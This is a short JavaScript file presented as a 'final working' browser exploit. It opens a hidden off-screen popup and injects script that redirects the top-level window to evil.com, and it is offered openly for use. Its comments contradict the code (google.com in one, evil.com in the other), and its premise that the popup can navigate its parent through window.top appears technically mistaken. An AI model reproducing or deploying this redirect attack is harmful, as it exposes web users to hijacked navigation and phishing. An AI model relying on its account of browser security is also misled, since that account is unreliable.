// Automated Popup Exploit Script
//
// FINAL WORKING VERSION based on all previous findings.
// This script leverages the unique security context where a child popup
// has more permissions than its parent. It opens a popup which then
// immediately navigates the top-level window.

(function() {
  console.log("[AUTOMATED-EXPLOIT] Starting...");

  try {
    // Langkah 1: Buka jendela popup. Ini adalah kunci untuk mendapatkan izin.
    const newWin = window.open('', '_blank', 'width=100,height=100,left=9999,top=9999');
    
    if (!newWin) {
      throw new Error("Popup window was blocked. Please allow popups for this to work.");
    }

    // Langkah 2: Tulis skrip ke dalam popup yang akan langsung dieksekusi.
    // Skrip ini akan menavigasi jendela utama ke google.com saat popup selesai dimuat.
    newWin.document.write(`
      <!DOCTYPE html>
      <html>
        <head><title>Navigating...</title></head>
        <body>
          <p>Navigating main window...</p>
          <script>
            window.onload = function() {
              try {
                // Perintah ini akan berhasil karena dijalankan dari dalam popup.
                window.top.location.href = "https://www.evil.com";
              } catch (e ) {
                // Pengaman jika terjadi kesalahan
                document.body.innerHTML = "Failed: " + e.message;
              }
            };
          <\/script>
        </body>
      </html>
    `);

    // Menutup dokumen agar 'onload' bisa berjalan.
    newWin.document.close();
    
    // FUNGSI PENUTUPAN OTOMATIS TELAH DIHAPUS DARI BAGIAN INI.
    // setTimeout(() => {
    //   newWin.close();
    // }, 500);

    console.log("[AUTOMATED-EXPLOIT] Popup opened and navigation command sent. The main tab should now be navigating.");

  } catch (e) {
    console.error("[AUTOMATED-EXPLOIT] Failed to execute:", e);
    alert("Exploit failed: " + e.message);
  }
})();
